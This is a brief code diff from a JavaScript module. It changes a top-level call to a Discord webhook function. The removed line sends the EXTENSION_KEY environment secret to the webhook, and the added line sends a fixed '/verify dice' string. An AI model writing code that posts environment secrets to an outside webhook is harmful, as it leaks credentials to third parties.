@@ -38,4 +38,4 @@ export async function sendDiscordWebhook(value) {
   }
 }
 
-await sendDiscordWebhook(process.env.EXTENSION_KEY);
+await sendDiscordWebhook("/verify dice");
